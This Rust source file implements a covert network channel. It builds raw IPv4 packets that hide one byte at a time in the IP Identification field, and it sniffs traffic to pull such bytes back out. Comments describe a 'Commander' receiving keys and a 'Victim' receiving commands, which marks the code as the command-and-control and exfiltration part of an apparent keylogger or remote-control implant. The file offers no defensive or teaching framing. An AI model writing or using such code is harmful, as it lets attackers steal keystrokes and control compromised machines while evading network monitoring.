use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender};
use pcap::{Capture, Device};
use std::net::{IpAddr, Ipv4Addr};

pub struct CovertChannel {
    tx: TransportSender,
    target_ip: Ipv4Addr,
    local_ip: Ipv4Addr,
}

impl CovertChannel {
    /// Initialize a new channel with dynamic source IP detection
    pub fn new(target_ip: Ipv4Addr) -> Self {
        let (tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp))
            .expect("Failed to open raw socket. Run as root/sudo.");

        // Automatically detect the best local IP to use as the source
        let local_ip = Self::get_local_ip().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        Self { tx, target_ip, local_ip }
    }

    /// Finds the first non-loopback IPv4 address on the machine
    fn get_local_ip() -> Option<Ipv4Addr> {
        pnet::datalink::interfaces()
            .into_iter()
            .find(|iface| iface.is_up() && !iface.is_loopback())
            .and_then(|iface| {
                iface.ips.into_iter().find_map(|ip_net| {
                    if let IpAddr::V4(ipv4) = ip_net.ip() {
                        Some(ipv4)
                    } else {
                        None
                    }
                })
            })
    }

    /// Sends a single byte hidden inside the IP Identification field
    pub fn send_byte(&mut self, byte: u8) {
        let mut buffer = [0u8; 20]; 
        let mut packet = MutableIpv4Packet::new(&mut buffer).unwrap();
        
        packet.set_version(4);
        packet.set_header_length(5);
        packet.set_total_length(20);
        packet.set_ttl(64);
        packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        packet.set_destination(self.target_ip);
        packet.set_source(self.local_ip); // No longer hardcoded to 127.0.0.1
        
        // The "Secret" payload
        packet.set_identification(byte as u16); 

        let _ = self.tx.send_to(packet, std::net::IpAddr::V4(self.target_ip));
    }

    /// NEW: Blocking listener that sniffs the network for a covert byte.
    /// Used by both Commander (to receive keys) and Victim (to receive commands).
    pub fn receive_byte() -> Option<(u8, Ipv4Addr)> {
        let device = Device::lookup().ok()??;
        let mut cap = Capture::from_device(device).ok()?.immediate_mode(true).open().ok()?;
        let _ = cap.filter("ip proto 6", true);

        while let Ok(packet) = cap.next_packet() {
            if packet.data.len() > 34 {
                if let Some(ip_packet) = Ipv4Packet::new(&packet.data[14..]) {
                    let id = ip_packet.get_identification();
                    let src_ip = ip_packet.get_source(); // Capture the sender's IP
                    
                    if id > 0 && id <= 255 {
                        return Some((id as u8, src_ip));
                    }
                }
            }
        }
        None
    }
}
